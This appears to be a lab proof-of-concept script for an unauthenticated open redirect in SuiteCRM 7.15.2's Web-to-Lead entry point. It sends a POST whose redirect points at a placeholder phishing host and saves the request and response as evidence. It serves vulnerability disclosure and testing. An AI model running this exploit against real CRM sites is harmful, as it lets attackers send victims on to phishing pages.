#!/usr/bin/env python3
"""
VULN-005 — Unauthenticated open redirect in Web-to-Lead capture (default config)

Software:    SuiteCRM 7.15.2 (forkedSuite commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb)
Sink:        modules/Campaigns/WebToLeadCapture.php:262-272
Root cause:  include/utils.php:6439-6469 isWebToLeadAllowedRedirectHost() returns
             true (fail-open) when $sugar_config['web_to_lead_allowed_redirect_hosts']
             is empty -- which is this lab's live config (config.php has the key
             present but set to an empty array()).

What this script does
----------------------
1. Confirms (informational) the fail-open config is present in the running
   container: web_to_lead_allowed_redirect_hosts => array() (empty).
2. Sends a single UNAUTHENTICATED POST to the WebToLeadCapture entry point with
   *no* campaign_id (so the lead-capture branch is skipped entirely -- see
   WebToLeadCapture.php:66-260 which is a no-op when campaign_id is unset) and
   redirect=<attacker URL>.
3. Asserts the response is a redirect (3xx) whose Location header points at the
   attacker-controlled origin, verbatim and unmodified -- the real security
   effect (CWE-601 open redirect), never merely "HTTP 200".

No SuiteCRM session, cookie, or account is used or required.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, BROWSER_UA, log, banner, rand, verdict  # noqa: E402

import requests  # noqa: E402

VULN_ID = "VULN-005"
TITLE = "Unauthenticated open redirect in Web-to-Lead capture (default config)"

EVIDENCE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")


def main():
    banner(VULN_ID, TITLE)
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    attacker_url = f"https://evil-cvehunter-{rand('w2l')}.example/phish"
    log("INFO", "Target sink: modules/Campaigns/WebToLeadCapture.php:262-272")
    log("INFO", "Root cause: include/utils.php:6439-6469 isWebToLeadAllowedRedirectHost()"
                " fail-opens when the allow-list is empty (this lab's live config.php"
                " has web_to_lead_allowed_redirect_hosts => array() -- confirmed via"
                " `docker compose exec app grep -n web_to_lead config.php`).")

    log("SETUP", "No account, session, or campaign is required -- campaign_id is"
                 " intentionally omitted so the lead-capture branch (:66-260) is a"
                 " no-op and control falls straight through to the vulnerable"
                 " redirect check at :262.")

    url = f"{BASE_URL}/index.php?entryPoint=WebToLeadCapture"
    body = {"redirect": attacker_url}

    log("STEP", f"UNAUTH POST {url}")
    log("STEP", f"body: {body}")

    req = requests.Request(
        "POST", url,
        data=body,
        headers={"User-Agent": BROWSER_UA,
                 "Content-Type": "application/x-www-form-urlencoded"},
    ).prepare()

    with requests.Session() as s:
        r = s.send(req, allow_redirects=False, timeout=30)

    # Persist raw request/response for the record.
    request_txt = (
        f"POST {req.url.replace(BASE_URL, '')} HTTP/1.1\r\n"
        f"Host: {BASE_URL.split('//', 1)[1]}\r\n"
        f"User-Agent: {BROWSER_UA}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(req.body)}\r\n"
        f"\r\n"
        f"{req.body}\r\n"
    )
    with open(os.path.join(os.path.dirname(__file__), "request.http"), "w") as f:
        f.write(request_txt)

    resp_headers = "\r\n".join(f"{k}: {v}" for k, v in r.headers.items())
    response_txt = f"HTTP/1.1 {r.status_code} {r.reason}\r\n{resp_headers}\r\n\r\n{r.text}"
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as f:
        f.write(response_txt)

    location = r.headers.get("Location", "")
    log("PROOF", f"HTTP {r.status_code} {r.reason}")
    log("PROOF", f"Location: {location!r}")

    with open(os.path.join(EVIDENCE_DIR, "location_header.txt"), "w") as f:
        f.write(f"request: POST {url}\nbody: {body}\n\n"
                f"response status: {r.status_code}\nLocation: {location}\n")

    ok = (300 <= r.status_code < 400) and location == attacker_url
    if ok:
        log("OK", "Unauthenticated request redirected the browser off-origin to the"
                   " attacker URL, verbatim -- fail-open allow-list confirmed live.")
        verdict(VULN_ID, "CONFIRMED",
                f"unauth POST redirected (HTTP {r.status_code}) to attacker origin"
                f" {location}")
        return 0
    else:
        log("FAIL", f"did not observe the expected off-site redirect "
                     f"(status={r.status_code}, location={location!r})")
        verdict(VULN_ID, "FAILED", "no off-site Location observed -- see run.log")
        return 1


if __name__ == "__main__":
    sys.exit(main())
